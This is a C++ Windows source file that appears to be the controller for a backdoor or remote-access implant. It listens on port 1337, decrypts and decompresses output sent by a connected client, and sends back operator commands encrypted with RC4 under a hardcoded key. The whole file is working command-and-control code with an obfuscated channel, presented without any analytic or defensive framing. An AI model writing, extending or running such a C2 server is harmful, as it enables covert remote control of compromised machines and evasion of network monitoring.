#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include "../draftdown/rc4.h"
#include "../snappy/snappy.h"

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "../snappy/build32/Release/snappy.lib")

#define DEFAULT_BUFLEN 4096
#define DEFAULT_PORT "1337"

std::string string_to_hex(const std::string& input)
{
    static const char hex_digits[] = "0123456789ABCDEF";

    std::string output;
    output.reserve(input.length() * 2);
    for (unsigned char c : input)
    {
        output.push_back(hex_digits[c >> 4]);
        output.push_back(hex_digits[c & 15]);
    }
    return output;
}

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    std::string cmd;

    const uint8_t* key = (uint8_t*)"FtkvWPDfIdKGWvP5788D4kNeO6FMCXsO";
    const int key_length = 32;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for connecting to server
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // Accept a client socket
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // No longer need server socket
    closesocket(ListenSocket);
    // Receive until the peer shuts down the connection
    do {

        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);

        if (iResult > 0) {

            // decrypt first
            uint8_t sbox[256];
            uint8_t *ciphered = new uint8_t[iResult + 1];

            generateRC4SBox(sbox, key, key_length);

            RC4(0, 0, 0, 3328, sbox, -0x2); //"Fast forward by 3328 bytes"
            RC4((const uint8_t*)recvbuf, ciphered, 0, iResult, sbox, -0x2);
            ciphered[iResult] = 0;

            //std::cout << std::endl << "___________________________" << std::endl;
            //printf("Decrypted received: %s\n", ciphered);
            //std::cout << std::endl << "___________________________" << std::endl;


            // then decompress
            std::string decompressed_response;
            snappy::Uncompress((const char*)ciphered, iResult, &decompressed_response);


            //std::cout << "Decompressed received: ";
            std::cout << decompressed_response;
            //std::cout << std::endl << "___________________________" << std::endl;

            // get command input
            std::getline(std::cin, cmd);

            std::cout << std::endl << string_to_hex(cmd) << std::endl;

            // compression removed
            std::string compressed_cmd(cmd);

            // then encrypt
            ciphered = new uint8_t[compressed_cmd.length()+1];
            ciphered[compressed_cmd.length()] = 0;

            memset(sbox, 0, 256);
            generateRC4SBox(sbox, key, key_length);

            RC4(0, 0, 0, 3840, sbox, 0x3); //"Fast forward by 3840 bytes"
            RC4((const uint8_t*)compressed_cmd.c_str(), ciphered, 0, compressed_cmd.length(), sbox, 0x3);

            //printf("Encrypted command: %s\n", ciphered);
            //std::cout << std::endl << string_to_hex(std::string((const char*)ciphered, compressed_cmd.length())) << std::endl;
            //std::cout << std::endl << "___________________________" << std::endl;

            // Echo the buffer back to the sender
            iSendResult = send(ClientSocket, (const char*)ciphered, compressed_cmd.length(), 0);
            
            if (iSendResult == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }
            if (cmd == "exit")
            {
                break;
            }
            cmd = "";
        }
        else if (iResult == 0)
            printf("Connection closing...\n");
        else {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

    } while (iResult > 0);

    // shutdown the connection since we're done
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ClientSocket);
    WSACleanup();

    return 0;
}